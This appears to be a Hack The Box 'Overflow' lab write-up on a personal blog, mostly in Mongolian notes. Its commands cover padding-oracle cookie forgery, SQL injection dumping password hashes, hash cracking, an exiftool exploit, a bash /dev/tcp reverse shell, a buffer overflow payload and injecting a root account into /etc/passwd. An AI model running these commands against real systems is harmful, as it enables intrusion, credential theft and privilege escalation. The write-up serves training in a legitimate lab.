<!doctype html><html lang=mn dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>HTB - Overflow | CaDiL's Blog</title>
<meta name=keywords content="Writeup"><meta name=description content="HTB - Overflow - Writeup /Mostly Notes/"><meta name=author content="CaDiL"><link rel=canonical href=https://cadil.github.io/posts/2024-03-07-htb-overflow-writeup/><link crossorigin=anonymous href=/assets/css/stylesheet.b609c58d5c11bb90b1a54e04005d74ad1ddf22165eb79f5533967e57df9c3b50.css integrity="sha256-tgnFjVwRu5CxpU4EAF10rR3fIhZet59VM5Z+V9+cO1A=" rel="preload stylesheet" as=style><link rel=icon href=https://cadil.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://cadil.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://cadil.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://cadil.github.io/apple-touch-icon.png><link rel=mask-icon href=https://cadil.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=mn href=https://cadil.github.io/posts/2024-03-07-htb-overflow-writeup/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="HTB - Overflow"><meta property="og:description" content="HTB - Overflow - Writeup /Mostly Notes/"><meta property="og:type" content="article"><meta property="og:url" content="https://cadil.github.io/posts/2024-03-07-htb-overflow-writeup/"><meta property="og:image" content="https://cadil.github.io/static"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-03-07T00:00:00+00:00"><meta property="article:modified_time" content="2024-03-07T00:00:00+00:00"><meta property="og:site_name" content="CaDiL's Blog"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://cadil.github.io/static"><meta name=twitter:title content="HTB - Overflow"><meta name=twitter:description content="HTB - Overflow - Writeup /Mostly Notes/"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://cadil.github.io/posts/"},{"@type":"ListItem","position":2,"name":"HTB - Overflow","item":"https://cadil.github.io/posts/2024-03-07-htb-overflow-writeup/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HTB - Overflow","name":"HTB - Overflow","description":"HTB - Overflow - Writeup /Mostly Notes/","keywords":["Writeup"],"articleBody":"1. IP Address # Machine Address 10.10.11.136 # Local Address 10.10.14.4 2. Nmap nmap -sV -sC -oA nmap/overflow 10.10.11.119 Out:\nStarting Nmap 7.91 ( https://nmap.org ) at 2022-02-27 01:01 EST Nmap scan report for 10.10.11.119 Host is up (0.24s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 eb:7c:15:8f:f2:cc:d4:26:54:c1:e1:57:0d:d5:b6:7c (RSA) | 256 d9:5d:22:85:03:de:ad:a0:df:b0:c3:00:aa:87:e8:9c (ECDSA) |_ 256 fa:ec:32:f9:47:17:60:7e:e0:ba:b6:d1:77:fb:07:7b (ED25519) 25/tcp open smtp Postfix smtpd |_smtp-commands: overflow, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Overflow Sec Service Info: Host: overflow; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 65.74 seconds sudo nmap -sU -sV -sC 10.10.11.119 --min-rate 7500 -F Out:\nNmap scan report for 10.10.11.119 Host is up (0.24s latency). Not shown: 94 open|filtered ports PORT STATE SERVICE VERSION 497/udp closed retrospect 1026/udp closed win-rpc 1646/udp closed radacct 1719/udp closed h323gatestat 33281/udp closed unknown 49156/udp closed unknown Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 683.43 seconds sudo nmap -sU -top-ports=20 overflow.htb Out:\nStarting Nmap 7.91 ( https://nmap.org ) at 2022-02-27 02:34 EST Stats: 0:00:04 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan UDP Scan Timing: About 80.00% done; ETC: 02:35 (0:00:01 remaining) Nmap scan report for overflow.htb (10.10.11.119) Host is up (0.25s latency). PORT STATE SERVICE 53/udp closed domain 67/udp open|filtered dhcps 68/udp closed dhcpc 69/udp closed tftp 123/udp closed ntp 135/udp open|filtered msrpc 137/udp closed netbios-ns 138/udp closed netbios-dgm 139/udp closed netbios-ssn 161/udp closed snmp 162/udp closed snmptrap 445/udp closed microsoft-ds 500/udp open|filtered isakmp 514/udp closed syslog 520/udp closed route 631/udp closed ipp 1434/udp closed ms-sql-m 1900/udp closed upnp 4500/udp closed nat-t-ike 49152/udp closed unknown nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.119 nmap -p 22,25,80 -sCV -oA scans/nmap-tcpscripts 10.10.11.119 3. Gobuster gobuster dir -u http://overflow.htb -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt Out:\n=============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://overflow.htb [+] Method: GET [+] Threads: 10 [+] Wordlist: /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2022/02/27 01:26:34 Starting gobuster in directory enumeration mode =============================================================== /home (Status: 301) [Size: 311] [--\u003e http://overflow.htb/home/] /assets (Status: 301) [Size: 313] [--\u003e http://overflow.htb/assets/] /config (Status: 301) [Size: 313] [--\u003e http://overflow.htb/config/] /config\ngobuster dir -u http://overflow.htb/config -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -x php Хэрэгтэй зүйл байгаагүй.\n4. SQL Truncation Эхлээд admin-нэртэй user давхар үүсгээд cookie авах гэсэн, болоогүй. Admin араас 45 удаа зай аваад үзэхээр болоогүй, admin өмнө нь нэг зай аваад гарсан cookie:\nGET /home/index.php HTTP/1.1 Host: overflow.htb User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://overflow.htb/register.php DNT: 1 Connection: close Cookie: auth=%2FoVZR9sAqmC53eoXs2m0%2BJkzW6wotphC Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 4.1 Padbuster digging хийж байгаад padbuster -р cookie авах болсон padbuster\npadbuster http://overflow.htb/login.php soVMzOVc6tujv2WuGlrUk%2F8reumdJbOp 8 -cookie auth=soVMzOVc6tujv2WuGlrUk%2F8reumdJbOp -plaintext user=admin Out:\n------------------------------------------------------- ** Finished *** [+] Encrypted value is: BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA ------------------------------------------------------- http://overflow.htb/admin_cms_panel/admin/login.php\n5. CMS Made Simple http://overflow.htb/admin_cms_panel/admin/\ncli:\ngobuster dir -u http://overflow.htb/admin_cms_panel/admin -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -x php out:\nGobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://overflow.htb/admin_cms_panel/admin [+] Method: GET [+] Threads: 10 [+] Wordlist: /opt/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Extensions: php [+] Timeout: 10s =============================================================== 2022/03/12 07:19:41 Starting gobuster in directory enumeration mode =============================================================== /index.php (Status: 302) [Size: 0] [--\u003e http://overflow.htb/admin_cms_panel/admin/login.php] /login.php (Status: 200) [Size: 4816] /templates (Status: 301) [Size: 338] [--\u003e http://overflow.htb/admin_cms_panel/admin/templates/] /themes (Status: 301) [Size: 335] [--\u003e http://overflow.htb/admin_cms_panel/admin/themes/] /header.php (Status: 500) [Size: 0] /footer.php (Status: 500) [Size: 0] /plugins (Status: 301) [Size: 336] [--\u003e http://overflow.htb/admin_cms_panel/admin/plugins/] /style.php (Status: 200) [Size: 53969] /lang (Status: 301) [Size: 333] [--\u003e http://overflow.htb/admin_cms_panel/admin/lang/] /logout.php (Status: 302) [Size: 0] [--\u003e http://overflow.htb/admin_cms_panel/admin/login.php] /myaccount.php (Status: 302) [Size: 0] [--\u003e http://overflow.htb/admin_cms_panel/admin/login.php] =============================================================== 2022/03/12 07:26:16 Finished =============================================================== онцгой зүйл алга. одоогоор…\nhttp://overflow.htb/admin_cms_panel/doc/CHANGELOG.txt\nVersion 2.2.8 - Flin Flon burp out:\nGET /admin_cms_panel/admin/login.php HTTP/1.1 Host: overflow.htb User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate DNT: 1 Connection: close Cookie: auth=BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA; CMSSESSIDf25decdf38ae=i1qs15u63sha9jh7a9c7s7ag10 Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 cli:\nsqlmap -r login.req --level 5 --risk 3 --threads 10 5.1 msfconsole cli:\nMatching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/multi/http/cmsms_object_injection_rce 2019-03-26 normal Yes CMS Made Simple Authenticated RCE via object injection дээрх болоогүй, python2, bound хийж байгаа нь таарахгүй.\ncli:\nsudo apt update \u0026\u0026 sudo apt -y install exploitdb 2.2.8 дээр ажиллах нь python2 дээр бичигдсэн. Pyenv суулгаад бас болохгүй байна…\n6. SQLMap http://overflow.htb/config/admin_last_login.js\nasync function getUsers() { let url = 'http://overflow.htb/home/logs.php?name=admin'; try { let res = await fetch(url); return await res.text(); } catch (error) { console.log(error); } } async function renderUsers() { let users = await getUsers(); let html = ''; let container = document.querySelector('.content'); container.innerHTML = users; } renderUsers(); cli:\nsqlmap -u http://overflow.htb/home/logs.php?name= --cookie auth=BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA cli:\nsqlmap -u http://overflow.htb/home/logs.php?name= --cookie auth=BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA --dbs out:\n[12:41:05] [INFO] the back-end DBMS is MySQL web server operating system: Linux Ubuntu 18.04 (bionic) web application technology: Apache 2.4.29 back-end DBMS: MySQL \u003e= 5.0.12 [12:41:05] [INFO] fetching database names available databases [4]: [*] cmsmsdb [*] information_schema [*] logs [*] Overflow cli:\nsqlmap -u http://overflow.htb/home/logs.php?name= --cookie auth=BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA cmsmsdb --tables out:\n| cms_module_templates | | cms_modules | | cms_permissions | | cms_permissions_seq | | cms_routes | | cms_siteprefs | | cms_user_groups | | cms_userplugins | | cms_userplugins_seq | | cms_userprefs | | cms_users | | cms_users_seq | | cms_version | +---------------------------------------+ cms_users\ncli:\nsqlmap -u http://overflow.htb/home/logs.php?name= --cookie auth=BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA -D cmsmsdb -T cms_users --dump out:\nDatabase: cmsmsdb Table: cms_users [2 entries] +---------+--------------------+--------+----------------------------------+----------+-----------+------------+---------------------+--------------+---------------------+ | user_id | email | active | password | username | last_name | first_name | create_date | admin_access | modified_date | +---------+--------------------+--------+----------------------------------+----------+-----------+------------+---------------------+--------------+---------------------+ | 1 | admin@overflow.htb | 1 | c6c6b9310e0e6f3eb3ffeb2baff12fdd | admin | | | 2021-05-24 21:18:35 | 1 | 2021-05-26 14:49:15 | | 3 | | 1 | e3d748d58b58657bfa4dffe2def0b1c7 | editor | | editor | 2021-05-25 06:38:33 | 1 | 2021-05-26 04:13:58 | +---------+--------------------+--------+----------------------------------+----------+-----------+------------+---------------------+--------------+---------------------+ admin@overflow.htb:c6c6b9310e0e6f3eb3ffeb2baff12fdd:admin :e3d748d58b58657bfa4dffe2def0b1c7:editor\nsalt\nsqlmap -u 'http://overflow.htb/home/logs.php?name=' --cookie auth=BAitGdYOupMjA3gl1aFoOwAAAAAAAAAA -D cmsmsdb -T cms_siteprefs --dump | sitemask | 6c2d17f37e226486\nhash:\ne3d748d58b58657bfa4dffe2def0b1c7:6c2d17f37e226486 6.1 Hashcat cli:\nhashcat -m 20 hash /usr/share/wordlists/rockyou.txt ### Result e3d748d58b58657bfa4dffe2def0b1c7:6c2d17f37e226486:alpha!@#$%bravo editor:alpha!@#$%bravo devbuild-job.overflow.htb etc/host дотор нэмэх -\u003e devbuild-job.overflow.htb\nUpload хийх боломжтой хэсэг: 6.2 Msfconsole with exiftool cli:\nmsf6 \u003e use 0 [*] No payload configured, defaulting to cmd/unix/reverse_netcat msf6 exploit(unix/fileformat/exiftool_djvu_ant_perl_injection) \u003e options Module options (exploit/unix/fileformat/exiftool_djvu_ant_perl_injection): Name Current Setting Required Description ---- --------------- -------- ----------- FILENAME msf.jpg yes Output file Payload options (cmd/unix/reverse_netcat): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 192.168.1.37 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port **DisablePayloadHandler: True (no handler will be created!)** Exploit target: Id Name -- ---- 0 JPEG file msf6 exploit(unix/fileformat/exiftool_djvu_ant_perl_injection) \u003e set LHOST 10.10.14.36 LHOST =\u003e 10.10.14.36 msf6 exploit(unix/fileformat/exiftool_djvu_ant_perl_injection) \u003e set LPORT 9001 LPORT =\u003e 9001 msf6 exploit(unix/fileformat/exiftool_djvu_ant_perl_injection) \u003e 6.3 nc with shell balance nc -lvnp 9001 ### listening on [any] 9001 ... connect to [10.10.14.36] from (UNKNOWN) [10.10.11.119] 56042 ls index.php resume_upload.php script.js style.css id uid=33(www-data) gid=33(www-data) groups=33(www-data) shell balance:\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")' ctrl+z\nstty raw -echo f+g [enter enter] буцаад nc орлоо\nexport TERM=xterm 7. Exploitation cli: /linpeas/\npython3 -m http.server ## Machine curl 10.10.14.108:8000/linpeas.sh -o linpeas.sh out:\n╔══════════╣ Searching passwords in config PHP files $config['db_password'] = 'sh@tim@n'; $this-\u003e_types['db_password'] = self::TYPE_STRING; #define('DB_Password','root'); #define('DB_Username', 'root'); ╔══════════╣ Unexpected in /opt (usually empty) total 16 drwxr-xr-x 3 root root 4096 Sep 17 21:56 . drwxr-xr-x 25 root root 4096 Jan 26 21:08 .. -rwxr-x---+ 1 tester tester 109 May 28 2021 commontask.sh drwxr-x---+ 2 root root 4096 Sep 17 21:56 file_encrypt developer:sh@tim@n\nssh:\nssh developer@overflow.htb uid=1001(developer) gid=1001(developer) groups=1001(developer),1002(network) ## user.txt $ cat user.txt cat: user.txt: Permission denied commontask.sh\ncommontask.sh file_encrypt $ cat commontask.sh #!/bin/bash #make sure its running every minute. bash \u003c \u003c(curl -s http://taskmanage.overflow.htb/task.sh) commontask -тай адил script үүсгэх\necho \"10.10.14.41 taskmanage.overflow.htb\" \u003e\u003e /etc/hosts machine дах etc/hosts дотор өөрийн vm IP-г өгнө. taskmanage - subdomain байхгүй болохоор\n# The following lines are desirable for IPv6 capable hosts ::1 localhost ip6-localhost ip6-loopback ff02::1 ip6-allnodes ff02::2 ip6-allrouters $ echo \"10.10.14.108 taskmanage.overflow.htb\" \u003e\u003e /etc/hosts $ cat /etc/hosts 127.0.0.1 localhost 127.0.1.1 overflow overflow.htb # The following lines are desirable for IPv6 capable hosts ::1 localhost ip6-localhost ip6-loopback ff02::1 ip6-allnodes ff02::2 ip6-allrouters 10.10.14.36 taskmanage.overflow.htb VM -с\necho \"bash -i \u003e\u0026 /dev/tcp/10.10.14.41/9001 0\u003e\u00261\" \u003e task.sh sudo python3 -m http.server 80 nc -lvnp 9001 үүсгээд тэгээд хүлээнэ.\nuser.txt\n647b4a********** 8. Enumeration 8.1 ssh cli:\nssh-keygen cd .ssh cp id_rsa.pub authorized_keys chmod 600 ./authorized_keys id_rsa\n-----BEGIN RSA PRIVATE KEY----- MIIEogIBAAKC********** -----END RSA PRIVATE KEY----- cli:\nchmod 600 id_rsa ssh tester@overflow.htb -i id_rsa file_encrypt:\ntester@overflow:/opt$ cd file_encrypt total 16K -rwsr-xr-x 1 root root 12K May 31 2021 file_encrypt -rw-r--r-- 1 root root 399 May 30 2021 README.md linpeas:\npython3 -m http.server ## Machine curl 10.10.14.108:8000/linpeas.sh -o linpeas.sh chmod +x linpeas.sh linpeas хэрэгтэй зүйл байгаагүй.\nREADME.md\ntester@overflow:/opt$ cat file_encrypt/README.md Our couple of reports have been leaked to avoid this. We have created a tool to encrypt your reports. Please check the pin feature of this application and report any issue that you get as this application is still in development. We have modified the tool a little bit that you can only use the pin feature now. The encrypt function is there but you can't use it now.The PIN should be in your inbox 8.2 file_encrypt ./file_encrypt\ntester@overflow:/opt/file_encrypt$ ./file_encrypt This is the code 1804289383. Enter the Pin: 555 Wrong Pin VM руу file_encrypt хуулах:\nscp -i ../ssh_keys/tester tester@overflow:/opt/file_encrypt/file_encrypt ./file_encrypt scp -i id_rsa tester@overflow.htb:/opt/file_encrypt/file_encrypt ./file_encrypt sha256sum-р алдаагүй хуулсан эсэх шалган үзэх.\n# Machine VM: 33246b48006e9967c59e332390ae698f99ad75bc05d80e6c8e61c66cd634eff9 file_encrypt # Local VM 33246b48006e9967c59e332390ae698f99ad75bc05d80e6c8e61c66cd634eff9 file_encrypt 8.3 Ghidra check_pin - filter -с хайж үзэх: /* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */ void check_pin(void) { undefined local_2c [20]; int local_18; long local_14; int local_10; local_10 = rand(); local_14 = random(); printf(\"This is the code %i. Enter the Pin: \",local_10); __isoc99_scanf(\u0026DAT_00010d1d,\u0026local_18); if (local_14 == local_18) { printf(\"name: \"); __isoc99_scanf(\u0026DAT_00010c63,local_2c); puts( \"Thanks for checking. You can give your feedback for improvements at developer@overflow.htb\" ); } else { puts(\"Wrong Pin\"); } return; } local_14 = random(); - Call RANDOM дуудаж байгааг шалгаж үзэх:\n/* WARNING: Function: __x86.get_pc_thunk.ax replaced with injection: get_pc_thunk_ax */ /* WARNING: Unknown calling convention yet parameter storage is locked */ long random(void) { uint in_stack_00000004; uint local_c; int local_8; local_c = 0x6b8b4567; for (local_8 = 0; local_8 \u003c 10; local_8 = local_8 + 1) { local_c = local_c * 0x59 + 0x14; } return local_c ^ in_stack_00000004; } in_stack_00000004 - дахин тодорхойлох (xor,ing)\n8.4 gdb cli:\ngdb file_encrypt out:\n(gdb) disas random Dump of assembler code for function random: 0x0000081d \u003c+0\u003e: push %ebp 0x0000081e \u003c+1\u003e: mov %esp,%ebp 0x00000820 \u003c+3\u003e: sub $0x10,%esp 0x00000823 \u003c+6\u003e: call 0xb90 \u003c__x86.get_pc_thunk.ax\u003e 0x00000828 \u003c+11\u003e: add $0x2778,%eax 0x0000082d \u003c+16\u003e: movl $0x6b8b4567,-0x8(%ebp) 0x00000834 \u003c+23\u003e: movl $0x0,-0x4(%ebp) 0x0000083b \u003c+30\u003e: jmp 0x84d 0x0000083d \u003c+32\u003e: mov -0x8(%ebp),%eax 0x00000840 \u003c+35\u003e: imul $0x59,%eax,%eax 0x00000843 \u003c+38\u003e: add $0x14,%eax 0x00000846 \u003c+41\u003e: mov %eax,-0x8(%ebp) 0x00000849 \u003c+44\u003e: addl $0x1,-0x4(%ebp) 0x0000084d \u003c+48\u003e: cmpl $0x9,-0x4(%ebp) 0x00000851 \u003c+52\u003e: jle 0x83d 0x00000853 \u003c+54\u003e: mov -0x8(%ebp),%eax 0x00000856 \u003c+57\u003e: xor 0x8(%ebp),%eax 0x00000859 \u003c+60\u003e: leave 0x0000085a \u003c+61\u003e: ret End of assembler dump. 0x00000856 \u003c+57\u003e: xor 0x8(%ebp),%eax xor -н breakpoint\nb * random+57 (gdb) b * random+57 Breakpoint 1 at 0x856 breakpoint хүртэл run хийх\nr x /10x $ebp +8 0xffffd460: 0x6b8b4567 0x56557fa0 0xf7fa7000 0x56555ac7 0xffffd470: 0xf7fa7000 0xf7fe3230 0x00000000 0xf7df9bde 0xffffd480: 0xf7fa73fc 0x56557fa0 #!/usr/bin/python3 import ctypes local_c_initial = 0x6b8b4567 local_c = 0x6b8b4567 local_8 = 0 while (local_8\u003c10): local_c = local_c * 0x59 + 0x14 local_8 = local_8 + 1 PIN = ctypes.c_int(local_c ^ local_c_initial).value print(\"The Pin Code is:\", PIN) run:\nThe Pin Code is: -202976456 -202976456\ntester@overflow:/opt/file_encrypt$ ./file_encrypt This is the code 1804289383. Enter the Pin: -202976456 name: asdasdsadas Thanks for checking. You can give your feedback for improvements at developer@overflow.htb tester@overflow:/opt/file_encrypt$ Segmentation fault (core dumped)\ntester@overflow:/opt/file_encrypt$ ^C tester@overflow:/opt/file_encrypt$ ./file_encrypt This is the code 1804289383. Enter the Pin: -202976456 name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA Thanks for checking. You can give your feedback for improvements at developer@overflow.htb Segmentation fault (core dumped) gdb -гээс адил нэр хийж харвал:\nGNU gdb (Debian 10.1-1.7) 10.1.90.20210103-git Copyright (C) 2021 Free Software Foundation, Inc. License GPLv3+: GNU GPL version 3 or later This is free software: you are free to change and redistribute it. There is NO WARRANTY, to the extent permitted by law. Type \"show copying\" and \"show warranty\" for details. This GDB was configured as \"x86_64-linux-gnu\". Type \"show configuration\" for configuration details. For bug reporting instructions, please see: . Find the GDB manual and other documentation resources online at: . For help, type \"help\". Type \"apropos word\" to search for commands related to \"word\"... Reading symbols from file_encrypt... (No debugging symbols found in file_encrypt) (gdb) r Starting program: /home/va4mi/Documents/htb/machine/Overflow/www/file_encrypt This is the code 1804289383. Enter the Pin: -202976456 name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA Thanks for checking. You can give your feedback for improvements at developer@overflow.htb Program received signal SIGSEGV, Segmentation fault. 0x41414141 in ?? () 0x41414141 in ?? () AAAA -н HEX утга (EIP register)\n8.5 pattern_create.rb /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 300 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9 pattern_create ашиглаж 300 string үүсгээд name-n (gdb) оруулна.\n(gdb) r The program being debugged has been started already. Start it from the beginning? (y or n) y Starting program: /home/va4mi/Documents/htb/machine/Overflow/www/file_encrypt This is the code 1804289383. Enter the Pin: -202976456 name: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9 Thanks for checking. You can give your feedback for improvements at developer@overflow.htb Program received signal SIGSEGV, Segmentation fault. 0x35624134 in ?? () 0x35624134 in ?? ()\n8.6 pattern_offset.rb usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 300 -q 0x35624134 [*] Exact match at offset 44 CTRL+c\n(gdb) r The program being debugged has been started already. Start it from the beginning? (y or n) y Starting program: /home/va4mi/Documents/htb/machine/Overflow/www/file_encrypt This is the code 1804289383. Enter the Pin: -202976456 name: ^C Program received signal SIGINT, Interrupt. 0xf7fd0559 in __kernel_vsyscall () disas encrypt\n(gdb) disas encrypt Dump of assembler code for function encrypt: 0x5655585b \u003c+0\u003e: push %ebp 0x5655585c \u003c+1\u003e: mov %esp,%ebp 0x5655585e \u003c+3\u003e: push %ebx 0x5655585f \u003c+4\u003e: sub $0x94,%esp 0x56555865 \u003c+10\u003e: call 0x56555720 \u003c__x86.get_pc_thunk.bx\u003e 0x5655586a \u003c+15\u003e: add $0x2736,%ebx 0x56555870 \u003c+21\u003e: movl $0x0,-0x80(%ebp) 0x56555877 \u003c+28\u003e: movl $0x0,-0x7c(%ebp) 0x5655587e \u003c+35\u003e: movl $0x0,-0x78(%ebp) 0x56555885 \u003c+42\u003e: movl $0x0,-0x74(%ebp) 0x5655588c \u003c+49\u003e: movl $0x0,-0x70(%ebp) 0x56555893 \u003c+56\u003e: movl $0x0,-0x94(%ebp) 0x5655589d \u003c+66\u003e: movl $0x0,-0x90(%ebp) 0x565558a7 \u003c+76\u003e: movl $0x0,-0x8c(%ebp) 0x565558b1 \u003c+86\u003e: movl $0x0,-0x88(%ebp) 0x565558bb \u003c+96\u003e: movl $0x0,-0x84(%ebp) 0x565558c5 \u003c+106\u003e: sub $0xc,%esp 0x565558c8 \u003c+109\u003e: lea -0x2350(%ebx),%eax 0x565558ce \u003c+115\u003e: push %eax 0x565558cf \u003c+116\u003e: call 0x565555e0 0x565558d4 \u003c+121\u003e: add $0x10,%esp 0x565558d7 \u003c+124\u003e: sub $0x8,%esp 0x565558da \u003c+127\u003e: lea -0x80(%ebp),%eax 0x565558dd \u003c+130\u003e: push %eax 0x565558de \u003c+131\u003e: lea -0x233d(%ebx),%eax 0x565558e4 \u003c+137\u003e: push %eax 0x565558e5 \u003c+138\u003e: call 0x565556c0 \u003c__isoc99_scanf@plt\u003e 0x565558ea \u003c+143\u003e: add $0x10,%esp 0x565558ed \u003c+146\u003e: sub $0xc,%esp 0x565558f0 \u003c+149\u003e: lea -0x233a(%ebx),%eax 0x565558f6 \u003c+155\u003e: push %eax эхэлж байгаа 0x5655585b\npython -c “print(‘\\x41’ * 44 + ‘\\x5b\\x58\\x55\\x56’)” python -c \"print('\\x41' * 44 + '\\x5b\\x58\\x55\\x56')\" ## AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[XUV gdb\n(gdb) r The program being debugged has been started already. Start it from the beginning? (y or n) y Starting program: /home/va4mi/Documents/htb/machine/Overflow/www/file_encrypt This is the code 1804289383. Enter the Pin: -202976456 name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[XUV Thanks for checking. You can give your feedback for improvements at developer@overflow.htb Enter Input File: 8.7 Root user үүсгэх Machine:\ncp /etc/passwd /tmp/passwd tester@overflow:/opt/file_encrypt$ cd tester@overflow:~$ cp /etc/passwd /tmp/passwd tester@overflow:~$ cd /tmp/ tester@overflow:/tmp$ ls passwd systemd-private-1540515aec41459da3c1999dc74ef5f6-apache2.service-otzxtp systemd-private-1540515aec41459da3c1999dc74ef5f6-systemd-resolved.service-gHFf4R systemd-private-1540515aec41459da3c1999dc74ef5f6-systemd-timesyncd.service-agZrcR vmware-root_644-2730496954 tester@overflow:/tmp$ openssl passwd -1 -salt junkhead testing123 ## $1$junkhead$zXM9KUoB7KLu8Zm.JhCL31 ## echo \"junkhead:$1$junkhead$zXM9KUoB7KLu8Zm.JhCL31:0:0:root:/root:/bin/bash\" \u003e\u003e /tmp/passwd root2:r9PB6IP00tOFkjAH - нэмж оруулна\n... postfix:x:111:116::/var/spool/postfix:/usr/sbin/nologin 